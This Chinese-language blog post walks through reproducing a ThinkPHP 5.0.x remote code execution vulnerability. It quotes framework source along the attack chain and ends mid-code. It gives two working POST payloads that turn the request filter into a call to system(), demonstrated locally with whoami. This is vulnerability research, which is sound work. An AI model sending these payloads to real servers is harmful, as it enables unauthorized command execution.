<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/7/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现"><a href="#ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现" class="headerlink" title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现"></a>ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> ThinkPHP 5.0.0~5.0.23 </p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">post_ex1：_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br><span class="line">post_exp2：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>





<h2 id="过程复现-exp1"><a href="#过程复现-exp1" class="headerlink" title="过程复现(exp1)"></a>过程复现(exp1)</h2><p> 以 thinkphp 5.0.22 完整版为复现环境(为啥要完整版等会说)，下载地址：<a target="_blank" rel="noopener" href="http://www.thinkphp.cn/down/1260.html">http://www.thinkphp.cn/down/1260.html</a> </p>
<p> 官方补丁地址：<a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a> </p>
<p><img src="https://i.loli.net/2020/01/30/LohuXMViDeg9AxT.png" alt="image562"></p>
<p>其中<code>$this-&gt;&#123;$this-&gt;method&#125;($_POST);</code>可以执行任意接受一个数组的request方法,<code>$this-&gt;method</code>可以通过控制<code>$_POST[&#39;_method&#39;]</code>来控制</p>
<p>查找相关方法后选定<code>__construct</code>来修改request属性再结合其他方法形成利用链</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$options</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$item</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (property_exists(<span class="keyword">$this</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$item</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;filter)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter = Config::get(<span class="string">&#x27;default_filter&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存 php://input</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;input = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>查找request中可能命令执行的方法时发现,input()方法可以通过修改filter来达到任意命令执行的效果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析过滤器</span></span><br><span class="line">        <span class="variable">$filter</span> = <span class="keyword">$this</span>-&gt;getFilter(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            array_walk_recursive(<span class="variable">$data</span>, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);<span class="comment">//命令执行</span></span><br><span class="line">            reset(<span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filterValue(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/30/Fp5XRUNjlxABPWt.png" alt="image1678"></p>
<p>接着查找调用method()的地方,下断点</p>
<p><img src="https://i.loli.net/2020/01/30/F6ZvjtxGdP7uiKa.png" alt="image1768"></p>
<p>从入口点App.php开始查看可能作为攻击链一部分的地方</p>
<p>节选App.php关键内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">Request <span class="variable">$request</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$request</span> = is_null(<span class="variable">$request</span>) ? Request::instance() : <span class="variable">$request</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">// 获取应用调度信息</span></span><br><span class="line">            <span class="variable">$dispatch</span> = <span class="built_in">self</span>::<span class="variable">$dispatch</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 未设置调度信息则进行 URL 路由检测</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$dispatch</span>)) &#123;</span><br><span class="line">                <span class="variable">$dispatch</span> = <span class="built_in">self</span>::routeCheck(<span class="variable">$request</span>, <span class="variable">$config</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 记录当前调度信息</span></span><br><span class="line">            <span class="variable">$request</span>-&gt;dispatch(<span class="variable">$dispatch</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 记录路由和请求信息</span></span><br><span class="line">            ...</span><br><span class="line">            <span class="variable">$data</span> = <span class="built_in">self</span>::exec(<span class="variable">$dispatch</span>, <span class="variable">$config</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (HttpResponseException <span class="variable">$exception</span>) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$exception</span>-&gt;getResponse();</span><br><span class="line">        &#125;</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进routeCheck</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span>(<span class="params"><span class="variable">$request</span>, <span class="keyword">array</span> <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$path</span>   = <span class="variable">$request</span>-&gt;path();</span><br><span class="line">        <span class="variable">$depr</span>   = <span class="variable">$config</span>[<span class="string">&#x27;pathinfo_depr&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 路由检测</span></span><br><span class="line">        <span class="variable">$check</span> = !is_null(<span class="built_in">self</span>::<span class="variable">$routeCheck</span>) ? <span class="built_in">self</span>::<span class="variable">$routeCheck</span> : <span class="variable">$config</span>[<span class="string">&#x27;url_route_on&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$check</span>) &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="variable">$result</span> = Route::check(<span class="variable">$request</span>, <span class="variable">$path</span>, <span class="variable">$depr</span>, <span class="variable">$config</span>[<span class="string">&#x27;url_domain_deploy&#x27;</span>]);</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>跟进check,在获取method时调用了method方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$request</span>, <span class="variable">$url</span>, <span class="variable">$depr</span> = <span class="string">&#x27;/&#x27;</span>, <span class="variable">$checkDomain</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//检查解析缓存</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="variable">$method</span> = strtolower(<span class="variable">$request</span>-&gt;method());</span><br><span class="line">        <span class="comment">// 获取当前请求类型的路由规则</span></span><br><span class="line">       ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>返回App.php,我们可以看到一个敏感的函数<code>$data = self::exec($dispatch, $config);</code></p>
<p>跟进exec瞧一瞧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$dispatch</span>, <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$dispatch</span>[<span class="string">&#x27;type&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;redirect&#x27;</span>: <span class="comment">// 重定向跳转</span></span><br><span class="line">                <span class="variable">$data</span> = Response::create(<span class="variable">$dispatch</span>[<span class="string">&#x27;url&#x27;</span>], <span class="string">&#x27;redirect&#x27;</span>)</span><br><span class="line">                    -&gt;code(<span class="variable">$dispatch</span>[<span class="string">&#x27;status&#x27;</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;module&#x27;</span>: <span class="comment">// 模块/控制器/操作</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="built_in">self</span>::module(</span><br><span class="line">                    <span class="variable">$dispatch</span>[<span class="string">&#x27;module&#x27;</span>],</span><br><span class="line">                    <span class="variable">$config</span>,</span><br><span class="line">                    <span class="keyword">isset</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>]) ? <span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>] : <span class="literal">null</span></span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;controller&#x27;</span>: <span class="comment">// 执行控制器操作</span></span><br><span class="line">                <span class="variable">$vars</span> = array_merge(Request::instance()-&gt;param(), <span class="variable">$dispatch</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">                <span class="variable">$data</span> = Loader::action(</span><br><span class="line">                    <span class="variable">$dispatch</span>[<span class="string">&#x27;controller&#x27;</span>],</span><br><span class="line">                    <span class="variable">$vars</span>,</span><br><span class="line">                    <span class="variable">$config</span>[<span class="string">&#x27;url_controller_layer&#x27;</span>],</span><br><span class="line">                    <span class="variable">$config</span>[<span class="string">&#x27;controller_suffix&#x27;</span>]</span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;method&#x27;</span>: <span class="comment">// 回调方法</span></span><br><span class="line">                <span class="variable">$vars</span> = array_merge(Request::instance()-&gt;param(), <span class="variable">$dispatch</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">                <span class="variable">$data</span> = <span class="built_in">self</span>::invokeMethod(<span class="variable">$dispatch</span>[<span class="string">&#x27;method&#x27;</span>], <span class="variable">$vars</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>: <span class="comment">// 闭包</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="built_in">self</span>::invokeFunction(<span class="variable">$dispatch</span>[<span class="string">&#x27;function&#x27;</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;response&#x27;</span>: <span class="comment">// Response 实例</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="variable">$dispatch</span>[<span class="string">&#x27;response&#x27;</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;dispatch type not support&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39; </code>时会调用<code>Request::instance()-&gt;param()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;mergeParam)) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="keyword">$this</span>-&gt;method(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">			...</span><br><span class="line">            <span class="keyword">$this</span>-&gt;param      = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="keyword">$this</span>-&gt;route(<span class="literal">false</span>));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>而param则会调用input从而形成完整的攻击链,其中<code>$filter</code>时我们要执行的命令,<code>$this-&gt;param</code>则是参数,</p>
<p><code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</code></p>
<p>但是我们不能直接通过修改<code>__construct</code>来修改param,因为在运行过程中<code>$this-&gt;param</code>会被覆盖,但是<code>$this-&gt;get</code>却不会,于是我们需要覆盖<code>$this-&gt;filter</code>和<code>$this-&gt;get</code></p>
<p>接下来就是如何让<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39; </code>的问题了</p>
<p><img src="https://i.loli.net/2020/01/30/qeliaZJokYSUMg2.png" alt="image5781"></p>
<p>这也是为啥要tp完整版的原因,完整版里才有captcha模块</p>
<blockquote>
<p>注意我们请求的路由是<code>?s=captcha</code>，它对应的注册规则为<code>\think\Route::get</code>。在<code>method</code>方法结束后，返回的<code>$this-&gt;method</code>值应为<code>get</code>这样才能不出错，所以payload中有个<code>method=get</code> </p>
</blockquote>
<p>于是最后的payload是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure>

<h2 id="过程复现-exp2"><a href="#过程复现-exp2" class="headerlink" title="过程复现(exp2)"></a>过程复现(exp2)</h2><p>攻击链的前面基本相同,只有调用<code>Request::input</code>方法的地方不同而进入不同分支</p>
<p>我们看到<code>Request::param</code>方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;mergeParam)) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="keyword">$this</span>-&gt;method(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">			...</span><br><span class="line">            <span class="keyword">$this</span>-&gt;param      = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="keyword">$this</span>-&gt;route(<span class="literal">false</span>));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>注意这一个<code>$this-&gt;method(true);</code></p>
<p><code>Request::method</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span>(<span class="params"><span class="variable">$method</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$method</span>) &#123;</span><br><span class="line">           <span class="comment">// 获取原始请求类型</span></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;server(<span class="string">&#x27;REQUEST_METHOD&#x27;</span>) ?: <span class="string">&#x27;GET&#x27;</span>;</span><br><span class="line">       &#125; </span><br><span class="line">       ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>它会调用<code>Request::server</code>,而这个方法也会调用<code>Request::input</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">server</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;server)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server = <span class="variable">$_SERVER</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;server = array_merge(<span class="keyword">$this</span>-&gt;server, <span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;server, <span class="literal">false</span> === <span class="variable">$name</span> ? <span class="literal">false</span> : strtoupper(<span class="variable">$name</span>), <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>继续分析代码发现,rce的参数变为了<code>$this-&gt;server[&#39;REQUEST_METHOD&#39;]</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// 解析name</span></span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$type</span> = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 按.拆分成多维数组进行判断</span></span><br><span class="line">            <span class="keyword">foreach</span> (explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>) <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$val</span>])) &#123;</span><br><span class="line">                    <span class="variable">$data</span> = <span class="variable">$data</span>[<span class="variable">$val</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 无输入数据，返回默认值</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (is_object(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析过滤器</span></span><br><span class="line">        <span class="variable">$filter</span> = <span class="keyword">$this</span>-&gt;getFilter(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span 